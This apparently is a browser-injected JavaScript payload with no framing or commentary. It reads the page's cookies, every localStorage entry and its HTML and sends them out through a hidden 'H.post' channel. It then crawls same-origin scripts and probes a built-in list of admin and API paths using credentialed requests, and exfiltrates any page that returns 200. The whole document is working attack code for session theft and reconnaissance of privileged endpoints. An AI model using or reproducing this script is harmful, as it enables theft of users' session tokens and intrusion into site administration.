var H=window.__HL||{post:function(){},summary:function(){}};
function uniq(a){var s={},o=[];a.forEach(function(x){if(x&&!s[x]){s[x]=1;o.push(x)}});return o}
function ls(){var s=[];try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);s.push(k+"="+String(localStorage.getItem(k)).slice(0,900))}}catch(e){}return s.join("\n")}
function abs(u){try{return new URL(u,location.href).href}catch(e){return ""}}
H.post("dom",["URL "+location.href,"TITLE "+document.title,"COOKIE "+document.cookie,"--LS--",ls(),"--HTML--",document.documentElement.outerHTML.slice(0,14000)].join("\n"));
var srcs=uniq([].slice.call(document.querySelectorAll("script[src],link[href],iframe[src],form[action],a[href]")).map(function(e){return e.src||e.href||e.action}).map(abs).filter(function(u){return u&&u.indexOf(location.origin)===0}));
H.post("srcs",srcs.join("\n"));
var inline=[].slice.call(document.querySelectorAll("script:not([src])")).map(function(s){return s.text}).join("\n");
var found=[],RE=/["'\s()]\/?(api|admin|sys|manage|backend|console|cms|user|system|config|upload|file|order|member|agent|report|stat|list|add|edit)[A-Za-z0-9_\/\-]{2,60}/g;
function scan(t){t.replace(RE,function(x){found.push(x.replace(/^["'\s(]/,"").replace(/\/$/,""))})}
scan(inline+document.documentElement.outerHTML.slice(0,14000));
var CUR=["/admin/main/index","/admin/","/admin","/admin.php","/sys/main","/sys/","/manage/","/manage/index","/console/","/cms/","/backend/","/api/","/user/list","/upload","/login","/logout","/admin/main/home","/admin/main/index.html","/index.php","/admin/user/list","/system/"];
CUR.forEach(function(p){found.push(p)});
Promise.all(srcs.slice(0,15).map(function(u){return fetch(u,{credentials:"include"}).then(function(r){return r.text()}).catch(function(){return ""})})).then(function(txts){
  scan(txts.join("\n"));
  found=uniq(found).filter(function(p){return p.length>3&&p.length<90}).slice(0,160);
  H.post("paths",found.join("\n"));
  var out=[],i=0,hit=0;
  (function step(){
    if(i>=found.length||hit>60){H.summary("probe",out.join("\n"));return}
    var p=found[i++];var u=abs(p.charAt(0)==="/"?p:"/"+p);
    fetch(u,{credentials:"include"}).then(function(r){
      var line=r.status+" "+p;out.push(line);
      if(r.status===200){hit++;return r.text().then(function(t){H.post("hit200",u+"\n"+t.slice(0,2500))})}
    }).catch(function(){out.push("ERR "+p)}).then(step);
  })();
});
